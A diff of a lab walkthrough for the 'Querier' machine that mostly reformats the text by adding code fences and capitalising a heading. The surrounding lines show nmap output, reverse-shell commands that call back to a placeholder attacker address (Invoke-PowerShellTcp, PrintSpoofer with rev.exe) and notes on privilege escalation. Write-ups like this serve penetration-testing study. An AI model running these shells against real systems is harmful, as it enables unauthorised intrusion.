@@ -4,6 +4,7 @@ sort : 1
 
 # Querier
 
+```
 PORT        STATE   SERVICE         VERSION
 135/tcp     open    msrpc           Microsoft Windows RPC
 139/tcp     open    netbios-ssn     Microsoft Windows netbios-ssn
@@ -15,6 +16,7 @@ PORT        STATE   SERVICE         VERSION
 |_http-server-header: Microsoft-HTTPAPI/2.0
 47001/tcp   open    http            Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
 |_http-server-header: Microsoft-HTTPAPI/2.0
+```
 
 
 ```bash
@@ -165,6 +167,7 @@ C:\Windows\system32> whoami /priv
 since Invoke-PowerShellTcp.ps1 is a module, running the reverse shell in one line could not work, so it's better to add the function you wanna call at the end of the module so you can run it directly !!
 
 .EXAMPLE - add this line at the end
+
 Invoke-PowerShellTcp -Reverse -IPAddress IP_tun0 -Port 4444
 ```
 
@@ -228,11 +231,12 @@ C:\Windows\system32> PrintSpoofer64.exe -c "rev.exe IP_tun0 1235 -e cmd.exe"
 
 ```tip
 PrintSpoofer :: used mostly when you have a service account
+
 JuicyPotato  :: used mostly when you have a user account
 ```
 
 
-## gpp vulnerability privilege escalation
+## GPP vulnerability privilege escalation
 
 ```powershell
 # After running Powerup
